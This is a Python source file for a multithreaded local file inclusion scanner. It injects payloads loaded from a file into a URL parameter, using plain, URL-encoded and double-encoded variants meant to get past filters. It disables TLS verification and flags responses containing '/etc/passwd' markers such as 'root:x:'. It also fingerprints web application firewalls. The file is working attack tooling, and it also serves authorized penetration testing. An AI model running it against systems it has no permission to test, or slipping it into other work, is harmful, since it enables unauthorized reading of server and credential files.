import argparse
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

console = Console()

LFI_INDICATORS = [
    "root:x:",
    "[boot]",
    "localhost",
]

WAF_INDICATORS = [
    "cloudflare",
    "sucuri",
    "incapsula",
    "akamai",
    "mod_security",
    "waf",
    "denied",
    "forbidden",
    "error 403",
    "access denied",
]

def load_payloads(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except Exception as e:
        console.print(f"[red]Failed to load payloads from {file_path}: {e}[/red]")
        return []

def generate_payload_variants(payload):
    return [
        payload,
        quote(payload),
        quote(quote(payload)),
        payload.replace("/", "%2f"),
        quote(payload.replace("/", "%2f")),
    ]

def generate_urls(base_url, param, payloads):
    urls = []
    for payload in payloads:
        variants = generate_payload_variants(payload)
        for variant in variants:
            parsed = urlparse(base_url)
            query = parse_qs(parsed.query)
            query[param] = [variant]
            new_query = urlencode(query, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            urls.append((new_url, variant))
    return urls

def detect_waf(response):
    if not response:
        return False
    headers = " ".join([f"{k}:{v}" for k, v in response.headers.items()]).lower()
    body = response.text.lower()
    for waf_sig in WAF_INDICATORS:
        if waf_sig in headers or waf_sig in body:
            return True
    if response.status_code in [403, 406, 501]:
        return True
    return False

def check_url(url, indicators, session, timeout=10):
    try:
        resp = session.get(url, timeout=timeout, verify=False)
        vulnerable = any(ind.lower() in resp.text.lower() for ind in indicators)
        waf = detect_waf(resp)
        return (url, resp.status_code, vulnerable, waf)
    except:
        return (url, None, False, False)

def main():
    parser = argparse.ArgumentParser(description="Simple LFI scanner with payloads from file")
    parser.add_argument("-u", "--url", help="URL with injectable parameter (e.g. http://example.com/page.php?file=)", required=True)
    parser.add_argument("-p", "--payloads", help="File with LFI payloads", default="payloads_lfi.txt")
    parser.add_argument("-o", "--output", help="Save results to file", required=False)
    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP request timeout in seconds")
    args = parser.parse_args()

    payloads = load_payloads(args.payloads)
    if not payloads:
        console.print("[red]No payloads loaded. Exiting.[/red]")
        return

    parsed = urlparse(args.url)
    query = parse_qs(parsed.query)
    if not query:
        console.print("[red]Error: URL must contain a parameter for injection (e.g. ?file=)[/red]")
        return
    param = list(query.keys())[0]

    urls_to_check = generate_urls(args.url, param, payloads)

    table = Table(title="LFI Scan Results")
    table.add_column("URL", style="cyan", no_wrap=True)
    table.add_column("Status", justify="center")
    table.add_column("Vulnerable", justify="center")
    table.add_column("WAF Detected", justify="center")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; LFI Scanner/1.0)"})

    results = []

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.completed}/{task.total}"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("[green]Scanning LFI payloads...", total=len(urls_to_check))
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(check_url, url, LFI_INDICATORS, session, args.timeout): url for url, _ in urls_to_check}
            for future in as_completed(futures):
                url = futures[future]
                try:
                    u, status, vuln, waf = future.result()
                except Exception:
                    u, status, vuln, waf = url, None, False, False
                status_str = str(status) if status else "-"
                vuln_str = "[red]Yes[/red]" if vuln else "[green]No[/green]"
                waf_str = "[red]Yes[/red]" if waf else "[green]No[/green]"
                table.add_row(u, status_str, vuln_str, waf_str)
                results.append((u, status_str, "Yes" if vuln else "No", "Yes" if waf else "No"))
                progress.update(task, advance=1)

    console.print(table)

    if args.output:
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write("URL\tStatus\tVulnerable\tWAF Detected\n")
                for r in results:
                    f.write("\t".join(r) + "\n")
            console.print(f"[green]Results saved to {args.output}[/green]")
        except Exception as e:
            console.print(f"[red]Failed to save results: {e}[/red]")

if __name__ == "__main__":
    main()
